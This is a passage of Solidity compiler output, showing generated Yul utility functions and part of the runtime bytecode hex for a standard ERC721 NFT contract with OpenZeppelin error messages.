abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 28)\n        store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 36)\n        store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 25)\n        store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 41)\n        store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 32)\n        store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 24)\n        store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 33)\n        store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 61)\n        store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 48)\n        store_literal_in_memory_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed(headStart , value3, value2, value1, value0) -> tail {\n        tail := add(headStart, 128)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n        mstore(add(headStart, 96), sub(tail, headStart))\n        tail := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value3,  tail)\n\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_memory(size) -> memPtr {\n        memPtr := allocate_unbounded()\n        finalize_allocation(memPtr, size)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function array_allocation_size_t_bytes_memory_ptr(length) -> size {\n        // Make sure we can allocate memory without overflow\n        if gt(length, 0xffffffffffffffff) { panic_error_0x41() }\n\n        size := round_up_to_mul_of_32(length)\n\n        // add length slot\n        size := add(size, 0x20)\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_bytes4(value) -> cleaned {\n        cleaned := and(value, 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function copy_calldata_to_memory(src, dst, length) {\n        calldatacopy(dst, src, length)\n        // clear end\n        mstore(add(dst, length), 0)\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function finalize_allocation(memPtr, size) {\n        let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))\n        // protect against overflow\n        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }\n        mstore(64, newFreePtr)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() {\n        revert(0, 0)\n    }\n\n    function revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: caller is not token owne\")\n\n        mstore(add(memPtr, 32), \"r or approved\")\n\n    }\n\n    function store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer to non ERC721Re\")\n\n        mstore(add(memPtr, 32), \"ceiver implementer\")\n\n    }\n\n    function store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer from incorrect \")\n\n        mstore(add(memPtr, 32), \"owner\")\n\n    }\n\n    function store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: token already minted\")\n\n    }\n\n    function store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer to the zero add\")\n\n        mstore(add(memPtr, 32), \"ress\")\n\n    }\n\n    function store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approve to caller\")\n\n    }\n\n    function store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: address zero is not a va\")\n\n        mstore(add(memPtr, 32), \"lid owner\")\n\n    }\n\n    function store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: mint to the zero address\")\n\n    }\n\n    function store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: invalid token ID\")\n\n    }\n\n    function store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approval to current owne\")\n\n        mstore(add(memPtr, 32), \"r\")\n\n    }\n\n    function store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approve caller is not to\")\n\n        mstore(add(memPtr, 32), \"ken owner or approved for all\")\n\n    }\n\n    function store_literal_in_memory_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721 Metadata: URI query for n\")\n\n        mstore(add(memPtr, 32), \"onexistent token\")\n\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_bytes4(value) {\n        if iszero(eq(value, cleanup_t_bytes4(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b50600436106101005760003560e01c806370a0823111610097578063b88d4fde11610066578063b88d4fde146102ad578063c2229fea146102c9578063c87b56dd146102d3578063e985e9c51461030357610100565b806370a082311461022557806378ce90351461025557806395d89b4114610273578063a22cb4651461029157610100565b806323b872dd116100d357806323b872dd1461019f57806342842e0e146101bb5780636352211e146101d75780636e02007d1461020757610100565b806301ffc9a71461010557806306fdde0314610135578063081812fc14610153578063095ea7b314610183575b600080fd5b61011f600480360381019061011a91906119a9565b610333565b60405161012c9190611cda565b60405180910390f35b61013d610415565b60405161014a9190611cf5565b60405180910390f35b61016d60048036038101906101689190611a03565b6104a7565b60405161017a9190611c73565b60405180910390f35b61019d60048036038101906101989190611969565b6104ed565b005b6101b960048036038101906101b49190611853565b610605565b005b6101d560048036038101906101d09190611853565b610665565b005b6101f160048036038101906101ec9190611a03565b610685565b6040516101fe9190611c73565b60405180910390f35b61020f61070c565b60405161021c9190611e97565b60405180910390f35b61023f600480360381019061023a91906117e6565b610716565b60405161024c9190611e97565b60405180910390f35b61025d6107ce565b60405161026a9190611cf5565b60405180910390f35b61027b6107ea565b6040516102889190611cf5565b60405180910390f35b6102ab60048036038101906102a69190611929565b61087c565b005b6102c760048036038101906102c291906118a6565b610892565b005b6102d16108f4565b005b6102ed60048036038101906102e89190611a03565b610946565b6040516102fa9190611cf5565b60405180910390f35b61031d60048036038101906103189190611813565b6109b0565b60405161032a9190611cda565b60405180910390f35b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806103fe57507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b8061040e575061040d82610a44565b5b9050919050565b60606000805461042490612080565b80601f016020809104026020016040519081016040528092919081815260200182805461045090612080565b801561049d5780601f106104725761010080835404028352916020019161049d565b820191906000526020600020905b81548152906001019060200180831161048057829003601f168201915b5050505050905090565b60006104b282610aae565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b60006104f882610685565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610569576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161056090611e37565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16610588610af9565b73ffffffffffffffffffffffffffffffffffffffff1614806105b757506105b6816105b1610af9565b6109b0565b5b6105f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105ed90611e57565b60405180910390fd5b6106008383610b01565b505050565b610616610610610af9565b82610bba565b610655576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161064c90611d17565b60405180910390fd5b610660838383610c4f565b505050565b61068083838360405180602001604052806000815250610892565b505050565b60008061069183610f49565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610703576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fa90611e17565b60405180910390fd5b80915050919050565b6000600654905090565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610787576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161077e90611dd7565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60405180608001604052806057815260200161250e6057913981565b6060600180546107f990612080565b80601f016020809104026020016040519081016040528092919081815260200182805461082590612080565b80156108725780601f1061084757610100808354040283529160200191610872565b820191906000526020600020905b81548152906001019060200180831161085557829003601f168201915b5050505050905090565b61088e610887610af9565b8383610f86565b5050565b6108a361089d610af9565b83610bba565b6108e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108d990611d17565b60405180910390fd5b6108ee848484846110f3565b50505050565b6109003360065461114f565b6006547fef1da42f89c42f48befa143007e6f5efd84a2d1cc3dc97c5edd2d3373220f66d60405160405180910390a2600160065461093e9190611f40565b600681905550565b60606109518261116d565b610990576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161098790611e77565b60405180910390fd5b60405180608001604052806057815260200161250e605791399050919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b610ab78161116d565b610af6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610aed90611e17565b60405180910390fd5b50565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610b7483610685565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610bc683610685565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610c085750610c0781856109b0565b5b80610c4657508373ffffffffffffffffffffffffffffffffffffffff16610c2e846104a7565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610c6f82610685565b73ffffffffffffffffffffffffffffffffffffffff1614610cc5576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cbc90611d57565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610d35576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d2c90611d97565b60405180910390fd5b610d4283838360016111ae565b8273ffffffffffffffffffffffffffffffffffffffff16610d6282610685565b73ffffffffffffffffffffffffffffffffffffffff1614610db8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610daf90611d57565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a4610f4483838360016112d4565b505050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610ff5576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fec90611db7565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31836040516110e69190611cda565b60405180910390a3505050565b6110fe848484610c4f565b61110a848484846112da565b611149576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161114090611d37565b60405180910390fd5b50505050565b611169828260405180602001604052806000815250611471565b5050565b60008073ffffffffffffffffffffffffffffffffffffffff1661118f83610f49565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60018111156112ce57600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146112425780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461123a9190611f96565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146112cd5780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546112c59190611f40565b925050819055505b5b50505050565b50505050565b60006112fb8473ffffffffffffffffffffffffffffffffffffffff166114cc565b15611464578373ffffffffffffffffffffffffffffffffffffffff1663150b7a02611324610af9565b8786866040518563ffffffff1660e01b81526004016113469493929190611c8e565b602060405180830381600087803b15801561136057600080fd5b505af192505050801561139157506040513d601f19601f8201168201806040525081019061138e91906119d6565b60015b611414573d80600081146113c1576040519150601f19603f3d011682016040523d82523d6000602084013e6113c6565b606091505b5060008151141561140c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161140390611d37565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614915050611469565b600190505b949350505050565b61147b83836114ef565b61148860008484846112da565b6114c7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114be90611d37565b60405180910390fd5b505050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561155f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161155690611df7565b60405180910390fd5b6115688161116d565b156115a8576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161159f90611d77565b60405180910390fd5b6115b66000838360016111ae565b6115bf8161116d565b156115ff576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115f690611d77565b60405180910390fd5b6001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46117096000838360016112d4565b5050565b600061172061171b84611ed7565b611eb2565b90508281526020810184848401111561173c5761173b612175565b5b61174784828561203e565b509392505050565b60008135905061175e816124b1565b92915050565b600081359050611773816124c8565b92915050565b600081359050611788816124df565b92915050565b60008151905061179d816124df565b92915050565b600082601f8301126117b8576117b7612170565b5b81356117c884826020860161170d565b91505092915050565b6000813590506117e0816124f6565b92915050565b60